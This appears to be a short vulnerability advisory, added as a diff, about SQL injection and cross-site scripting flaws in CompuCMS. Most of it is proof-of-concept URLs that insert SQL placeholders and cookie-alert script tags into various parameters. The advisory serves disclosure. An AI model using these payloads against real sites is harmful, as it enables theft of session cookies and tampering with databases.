@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/42773/info
+
+CompuCMS is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+http://www.example.com/index.asp?mode=visresultat&sogeord=%27+ANY_SQL_CODE
+
+http://www.example.com/index.asp?mode=for!forside!gb&sprog=gb'"><script>alert(document.cookie)</script>
+
+http://www.example.com/_CompuCMS/_CMS_output/_viskarrusel.inc.asp?mode=alm!udflugtsmaal!dk&vispic=2138&Dir=&site=demo%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3Ed&NoElementNum=0&NoFirstElement
+
+http://www.example.com/_CompuCMS/_CMS_output/_viskarrusel.inc.asp?mode=alm!udflugtsmaal!dk&vispic=2138&Dir=%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C&site=demo&NoElementNum=0&NoFirstElement
+
+http://www.example.com/_CompuCMS/_CMS_output/_viskarrusel.inc.asp?mode=alm!udflugtsmaal!dk%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C&vispic=2138&Dir=&site=demo&NoElementNum=0&NoFirstElement
+
+http://www.example.com/_CompuCMS/_CMS_output/_visbillede.asp?billede=1.jpg&tekst=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+http://www.example.com/_CompuCMS/_CMS_output/_visbillede.asp?billede=1.jpg%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&tekst=
+
+http://www.example.com/_CompuCMS/_CMS_output/_viskarrusel.inc.asp?mode=alm!udflugtsmaal!dk&vispic=2138+ANY_SQL_CODE&Dir=www.compucms.dk/demo/&site=demo&NoElementNum=0&NoFirstElement
+
+http://www.example.com/demo/index.asp?mode=nyh!forside~1220010667!dk&visid=383%27+ANY_SQL_CODE
